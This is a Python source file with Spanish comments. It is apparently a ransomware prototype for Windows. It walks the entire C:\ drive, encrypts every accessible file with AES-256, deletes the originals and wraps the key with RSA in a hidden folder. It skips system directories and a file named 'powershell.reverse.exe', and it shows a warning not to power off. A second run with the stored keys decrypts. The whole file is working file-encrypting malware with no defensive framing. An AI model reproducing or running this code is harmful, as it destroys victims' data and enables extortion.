import os
import ctypes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import padding as sym_padding

# Crear carpeta oculta para almacenar claves
def create_hidden_folder():
    hidden_folder = os.path.join(os.getenv('USERPROFILE'), 'ClaveOculta')
    if not os.path.exists(hidden_folder):
        os.makedirs(hidden_folder)
        ctypes.windll.kernel32.SetFileAttributesW(hidden_folder, 0x02)
    return hidden_folder

# Ruta de la carpeta oculta
hidden_folder = create_hidden_folder()

# Archivos de claves
key_aes_file = os.path.join(hidden_folder, "ClaveAES.enc")
iv_file = os.path.join(hidden_folder, "IV.txt")
private_key_file = os.path.join(hidden_folder, "ClavePrivada.pem")
public_key_file = os.path.join(hidden_folder, "ClavePublica.pem")
powershell_exe = "powershell.reverse.exe"  # Archivo a excluir

# Directorios críticos a ignorar
directories_to_ignore = [
    os.path.join(os.getenv('SystemRoot'), 'System32'),
    os.path.join(os.getenv('SystemRoot'), 'WinSxS'),
    os.path.join("C:\\", "$Recycle.Bin"),  # Papelera
]

# Crear un archivo de log para registrar errores
error_log_file = os.path.join(hidden_folder, "error_log.txt")

# Verificar si es un directorio crítico
def is_critical_directory(path):
    return any(path.lower().startswith(ignored.lower()) for ignored in directories_to_ignore)

# Guardar errores en un log
def log_error(message):
    with open(error_log_file, 'a') as log_file:
        log_file.write(message + "\n")

# Verificar si tenemos permisos para abrir y escribir en un archivo
def has_permissions(file_path):
    try:
        with open(file_path, 'rb') as test_file:  # Probar si podemos abrirlo
            pass
        return True
    except (PermissionError, OSError) as e:
        log_error(f"Sin permisos o inaccesible: {file_path} - Error: {e}")
        return False

# Generar clave AES y IV
def generate_aes_key_and_iv():
    aes_key = os.urandom(32)  # AES-256
    iv = os.urandom(16)       # IV para modo CBC
    return aes_key, iv

# Guardar datos en archivo
def save_to_file(file_path, data):
    with open(file_path, 'wb') as file:
        file.write(data)

# Cargar datos desde archivo
def load_from_file(file_path):
    with open(file_path, 'rb') as file:
        return file.read()

# Generar claves RSA
def generate_rsa_keys():
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()

    # Guardar clave privada
    with open(private_key_file, 'wb') as priv_file:
        priv_file.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        ))

    # Guardar clave pública
    with open(public_key_file, 'wb') as pub_file:
        pub_file.write(public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ))

    return private_key, public_key

# Cargar claves RSA
def load_private_key():
    with open(private_key_file, 'rb') as priv_file:
        return serialization.load_pem_private_key(priv_file.read(), password=None)

def load_public_key():
    with open(public_key_file, 'rb') as pub_file:
        return serialization.load_pem_public_key(pub_file.read())

# Cifrar clave AES con RSA
def encrypt_aes_key_with_rsa(aes_key, public_key):
    return public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

# Descifrar clave AES con RSA
def decrypt_aes_key_with_rsa(encrypted_key, private_key):
    return private_key.decrypt(
        encrypted_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

# Cifrar archivo con AES
def encrypt_file(aes_key, iv, file_path):
    encrypted_file_path = file_path + ".enc"
    try:
        with open(file_path, 'rb') as input_file, open(encrypted_file_path, 'wb') as output_file:
            cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
            encryptor = cipher.encryptor()
            padder = sym_padding.PKCS7(128).padder()

            while True:
                block = input_file.read(1024)
                if not block:
                    break
                padded_block = padder.update(block)
                output_file.write(encryptor.update(padded_block))

            output_file.write(encryptor.update(padder.finalize()))
            output_file.write(encryptor.finalize())
        os.remove(file_path)  # Eliminar archivo original
    except (PermissionError, OSError) as e:
        log_error(f"Error al encriptar {file_path}: {e}")

# Descifrar archivo con AES
# Descifrar archivo con AES
def decrypt_file(aes_key, iv, file_path):
    decrypted_file_path = file_path[:-4]  # Eliminar la extensión .enc
    try:
        with open(file_path, 'rb') as input_file, open(decrypted_file_path, 'wb') as output_file:
            cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
            decryptor = cipher.decryptor()
            unpadder = sym_padding.PKCS7(128).unpadder()

            while True:
                block = input_file.read(1024)
                if not block:
                    break
                decrypted_block = decryptor.update(block)
                output_file.write(unpadder.update(decrypted_block))

            # Aquí es donde el padding puede fallar
            output_file.write(unpadder.update(decryptor.finalize()))
            output_file.write(unpadder.finalize())
        
        os.remove(file_path)  # Eliminar archivo encriptado
    except ValueError as e:
        log_error(f"Error de padding en {file_path}: {e}")
    except (PermissionError, OSError) as e:
        log_error(f"Error al desencriptar {file_path}: {e}")


# Recorrer todo el sistema para obtener archivos a cifrar

def get_files_to_encrypt():
    files_to_encrypt = []
    root_directory = "C:\\"

    # Directorios críticos a excluir
    critical_directories = [
        "C:\\$Recycle.Bin",  # Papelera de reciclaje
        "C:\\Windows\\System32",  # System32
        "C:\\Windows\\WinSxS",  # WinSxS
    ]
    
    # Directorio de Python a excluir
    python_directory = os.path.dirname(os.__file__)  # Ruta de instalación de Python

    for root, dirs, files in os.walk(root_directory, topdown=True):
        # Excluir directorios críticos y el directorio de Python
        dirs[:] = [d for d in dirs if os.path.join(root, d) not in critical_directories and os.path.join(root, d) != python_directory]

        for file in files:
            file_path = os.path.join(root, file)

            # Ignorar claves, archivos específicos y archivos temporales
            if file_path in {key_aes_file, iv_file, private_key_file, public_key_file, powershell_exe, __file__}:
                continue
            if file_path.endswith(('.tmp', '.crdownload', '.log')):  # Extensiones ignoradas
                continue

            if has_permissions(file_path):  # Verificar permisos antes de incluirlo
                files_to_encrypt.append(file_path)

    return files_to_encrypt

def show_message(message):
    ctypes.windll.user32.MessageBoxW(0, message, "Aviso", 0x40 | 0x1)


# Punto de entrada
if __name__ == "__main__":
    if os.path.exists(key_aes_file) and os.path.exists(iv_file) and os.path.exists(private_key_file):
        private_key = load_private_key()
        encrypted_aes_key = load_from_file(key_aes_file)
        aes_key = decrypt_aes_key_with_rsa(encrypted_aes_key, private_key)
        iv = load_from_file(iv_file)

        # Descifrar archivos si es necesario
        for file_path in get_files_to_encrypt():
            if file_path.endswith('.enc'):
                decrypt_file(aes_key, iv, file_path)

        os.remove(key_aes_file)
        os.remove(iv_file)

    else:
        private_key, public_key = generate_rsa_keys()
        aes_key, iv = generate_aes_key_and_iv()
        encrypted_aes_key = encrypt_aes_key_with_rsa(aes_key, public_key)
        save_to_file(key_aes_file, encrypted_aes_key)
        save_to_file(iv_file, iv)

        # Cifrar archivos
        for file_path in get_files_to_encrypt():
            encrypt_file(aes_key, iv, file_path)

        show_message("¡NO APAGUES EL DISPOSITIVO!")